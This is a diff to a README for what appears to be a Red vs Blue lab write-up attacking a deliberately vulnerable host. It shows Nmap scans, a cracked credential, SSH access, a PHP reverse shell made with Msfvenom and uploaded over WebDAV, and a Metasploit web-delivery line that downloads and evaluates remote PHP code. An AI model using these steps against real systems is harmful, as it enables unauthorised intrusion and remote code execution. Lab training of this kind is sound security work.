@@ -19,9 +19,10 @@ As an initial step, the Red Team will assess the vulnerability of the system.
 
 <kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Vuln.PNG width=700></kbd>
 
-### Exploits
+### Scans & Exploits
+#### Scans
 ```
-As an initial step, scans are run against the target machine to establish attack vectors.
+Scans are run against the target machine to establish attack vectors.
 
 $ Nmap -sV 192.168.1.105
 ```
@@ -33,6 +34,8 @@ $ Nmap -Pn --script vuln 192.168.1.105
 ```
 
 <kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Nmap2.PNG width=500></kbd>
+
+####  I
 ```
 With Apache Httpd open and Webdav showing up on our scans, it was clear the server would be accessible via a browser.
 Navigating to 192.168.1.105 allows us to browse through the server folders. 
@@ -62,6 +65,8 @@ We can now access the secret_folder directory.
 ```
 <kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http4.png></kbd>
 <kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http5.png></kbd>
+
+####  II
 ```
 There are very clear instructions on how to access Webdav, which we already know is of interest from out Nmap scan.
 Critically, there is also a hash along with the user account to be used.
@@ -73,7 +78,10 @@ However, we will first attempt to crack the hash and try using the result as Rya
 
 ```
 ✨✨ Ryan's credentials acquired ✨✨
+```
+#### III
 
+```
 With Ryan's credentials, paths open up and there are multiple attack vectors we can pursue.
 
 The most direct method is SSH. 
@@ -88,7 +96,10 @@ $ ssh ryan@192.168.1.105
 
 ```
 ✨✨ Success ✨✨
+```
+#### IV
 
+```
 The next method is to use an exploit and setup a reverse shell.
 We already have access to Webdav and we can upload and run files in there through a web browser.
 Therefore we create a PHP reverse shell payload using Msfvenom:
@@ -128,8 +139,10 @@ We now check Metasploit and see that a meterpreter session has been established.
 
 ```
 ✨✨ Success. We can then proceed to privilege escalation if it's required. ✨✨
+```
+#### V
 
-
+```
 The final exploit is using Metasploit's web delivery script.
 If the attacker has access to the target machine, which we do via Ryan's ssh, a meterpreter and shell can be established.
 
@@ -149,6 +162,9 @@ $ php –d allow_url_fopen=true –r “eval(file_get_contents(‘http://192.168
 ```
 <kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Webdelivery.png></kbd>
 
+```
+✨✨ Success ✨✨
+```
 
 
 
